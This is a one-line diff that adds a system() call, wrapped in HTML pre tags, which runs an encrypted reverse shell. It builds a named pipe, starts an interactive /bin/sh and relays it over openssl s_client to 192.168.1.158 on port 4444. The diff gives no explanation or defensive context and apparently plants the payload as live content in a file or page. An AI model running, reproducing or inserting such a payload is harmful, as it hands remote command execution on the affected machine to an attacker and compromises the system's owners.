@@ -1,0 +1,1 @@
+<pre>system('mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.158:4444 > /tmp/s; rm /tmp/s')</pre>
